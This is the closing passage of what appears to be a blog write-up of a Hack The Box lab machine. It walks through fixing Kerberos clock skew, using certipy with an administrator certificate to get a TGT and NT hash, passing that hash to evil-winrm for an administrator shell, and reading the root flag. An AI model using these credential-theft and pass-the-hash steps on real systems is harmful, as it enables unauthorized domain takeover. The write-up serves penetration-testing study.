</span></span><span style="display:flex;"><span>[*] Trying to get TGT...
</span></span><span style="display:flex;"><span>[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</span></span></code></pre></div><p>We get an error about clock skew. We can fix this by syncing time with the server using the <code>ntpdate</code> command</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo ntpdate 10.10.11.236
</span></span><span style="display:flex;"><span>2025-03-08 20:52:30.864797 (-0500) +25199.531592 +/- 0.009011 10.10.11.236 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 25199.531592
</span></span></code></pre></div><p>Now we re-run the command and it should work</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$certipy auth -pfx administrator.pfx
</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak (ly4k)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Using principal: administrator@manager.htb
</span></span><span style="display:flex;"><span>[*] Trying to get TGT...
</span></span><span style="display:flex;"><span>[*] Got TGT
</span></span><span style="display:flex;"><span>[*] Saved credential cache to &#39;administrator.ccache&#39;
</span></span><span style="display:flex;"><span>[*] Trying to retrieve NT hash for &#39;administrator&#39;
</span></span><span style="display:flex;"><span>[*] Got hash for &#39;administrator@manager.htb&#39;: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
</span></span></code></pre></div><p><em>Note: I had to run <code>ntpdate</code> and then the <code>certipy</code> command right after multiple times before it finally worked</em></p>
<p>Then we can pass the hash with <code>evil-winrm</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.236 -u administrator -H ae5064c2f62317332c88629e025924ef
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;
</span></span></code></pre></div><p>Finally we grab the root flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
</span></span><span style="display:flex;"><span>dd9896bb926cfaec9edcbe5664cf827b
</span></span></code></pre></div>
</content>
<p>
  
  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
  
  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
  
</p>

  </main>
  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo  Bear</a>
</footer>

    
</body>

</html>
